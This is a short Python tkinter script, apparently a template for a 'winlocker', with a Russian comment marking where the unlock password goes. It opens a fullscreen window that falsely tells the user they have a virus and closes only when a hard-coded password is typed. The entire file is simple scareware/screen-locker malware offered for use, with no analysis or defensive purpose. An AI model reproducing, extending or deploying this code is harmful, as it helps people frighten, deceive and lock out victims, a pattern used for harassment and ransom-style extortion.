import tkinter as tk
def checkpass():
    if entry.get() == "": #<--------- ВАШ ПАРОЛЬ
        root.destroy()

def create_winlocker():
    global root, entry
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(background='green')
    label = tk.Label(root, text= "error.You have got virus.error ", font=("Helvetica", 50), fg="black", bg="green" )
    label.pack(expand=True)

    entry = tk.Entry(root, show="*", font=("Helvetica", 24), fg="black", bg="white", width=20)
    entry.pack(pady=20)

    button = tk.Button(root, text="yes", font=("Helvetica", 18), command=checkpass)
    button.pack(pady=10)

  
    root.mainloop()

if __name__ == "__main__":
    create_winlocker()

